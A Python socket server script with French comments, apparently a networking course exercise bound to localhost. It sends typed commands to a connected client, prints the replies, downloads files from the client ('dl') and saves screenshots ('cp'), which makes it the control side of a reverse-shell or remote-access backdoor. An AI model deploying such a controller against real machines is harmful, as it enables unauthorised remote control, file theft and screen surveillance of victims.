# SOCKETS RÉSEAU : SERVEUR
#
# socket
#   bind (ip, port)  127.0.0.1 -> localhost
#   listen
#   accept -> socket / (ip, port)
#   close

# already used

import socket


HOST_IP = "127.0.0.1"
HOST_PORT = 36000
MAX_DATA_SIZE = 1024


# HANDSHAKE
def receive_socket_data(socket_p, data_len):
    current_data_len = 0
    total_data = None
    while current_data_len < data_len:
        chuck_len = data_len - current_data_len
        if chuck_len > MAX_DATA_SIZE:
            chuck_len = MAX_DATA_SIZE
        data_chunk = socket_p.recv(chuck_len)
        #print("len: ", len(data_chunk))
        if not data_chunk:
            return None
        if not total_data:
            total_data = data_chunk
        else:
            total_data += data_chunk
        current_data_len += len(data_chunk)
        #print(f'totale_len : {current_data_len}/{data_len}')
    return total_data


def send_receive_data(socket_n, commande):
    if not commande:
        return None
    socket_n.sendall(commande.encode())
    header_data = receive_socket_data(socket_n, 13)
    size_header_data = int(header_data.decode())
    #print("size header: ", size_header_data)
    data_r = receive_socket_data(socket_n, size_header_data)
    return data_r


s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST_IP, HOST_PORT))
s.listen()

print(f"Attente de connexion sur {HOST_IP}, port {HOST_PORT}...")
connection_socket, client_address = s.accept()
print(f"Connexion établie avec {client_address}")

dl_filename = None
cp_filename = None

while True:
    # ... infos
    infos_data = send_receive_data(connection_socket, "infos")
    if not infos_data:
        break
    cmd = input(client_address[0]+":"+str(client_address[1])+ " " + infos_data.decode() + "> ")
    if not cmd:
        continue
    cmd_split = cmd.split(" ")
    if len(cmd_split) == 2 and cmd_split[0] == "dl":
        dl_filename = cmd_split[1]
    if len(cmd_split) == 2 and cmd_split[0] == "cp":
        cp_filename = cmd_split[1]

    data = send_receive_data(connection_socket, cmd)
    if not data:
        break
    if dl_filename:
        if len(data) == 1 and data == b" ":
            print("ERROR: File", dl_filename, "not found")
        else:
            f = open(dl_filename, "wb")
            f.write(data)
            f.close()
            print("File", dl_filename, "downloaded.")
        dl_filename = None
    elif cp_filename:
        if len(data) == 1 and data == b" ":
            print("ERROR: File", cp_filename, "not found")
        else:
            f = open(cp_filename + ".png", "wb")
            f.write(data)
            f.close()
            print(f'Screenshot {cp_filename}.png Done.')
        cp_filename = None
    else:
        print(data.decode())

s.close()
connection_socket.close()